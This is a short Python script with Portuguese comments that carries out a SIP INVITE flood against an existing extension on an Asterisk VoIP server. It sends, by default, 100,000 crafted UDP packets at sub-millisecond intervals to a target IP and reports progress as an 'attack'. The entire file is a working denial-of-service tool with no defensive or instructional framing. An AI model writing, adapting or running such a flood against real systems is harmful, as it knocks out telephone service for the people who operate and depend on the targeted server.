import socket
import time
import argparse

# Argumentos
parser = argparse.ArgumentParser(description="Ataque SIP Flood contra ramal existente")
parser.add_argument("--ip", required=True, help="IP do servidor Asterisk")
parser.add_argument("--porta", type=int, default=5060, help="Porta SIP (default 5060)")
parser.add_argument("--pacotes", type=int, default=100000, help="Número de pacotes (default 100000)")
parser.add_argument("--intervalo", type=float, default=0.0001, help="Intervalo entre pacotes (default 0.0001s)")
parser.add_argument("--ramal", default="1000", help="Ramal existente para ataque (default 1000)")
args = parser.parse_args()

# Pacote SIP direcionado para ramal válido
mensagem_sip = f"""INVITE sip:{args.ramal}@{args.ip} SIP/2.0
Via: SIP/2.0/UDP 192.168.0.100:{args.porta};branch=z9hG4bK-attack
From: <sip:teste@{args.ip}>;tag=12345
To: <sip:{args.ramal}@{args.ip}>
Call-ID: ataque-{{}}@192.168.0.100
CSeq: 1 INVITE
Contact: <sip:teste@192.168.0.100>
Max-Forwards: 70
User-Agent: SIPFloodTool
Content-Length: 0

"""

# Socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(f"🚀 Iniciando SIP Flood para ramal {args.ramal} em {args.ip}:{args.porta}...")

# Enviar pacotes
inicio = time.time()
for i in range(1, args.pacotes + 1):
    pacote = mensagem_sip.format(i)
    sock.sendto(pacote.encode(), (args.ip, args.porta))

    if i % 1000 == 0 or i == args.pacotes:
        print(f"📤 {i} pacotes enviados")
    
    time.sleep(args.intervalo)
fim = time.time()

print(f"\n✅ Ataque concluído! {args.pacotes} pacotes enviados em {fim - inicio:.2f} segundos.")
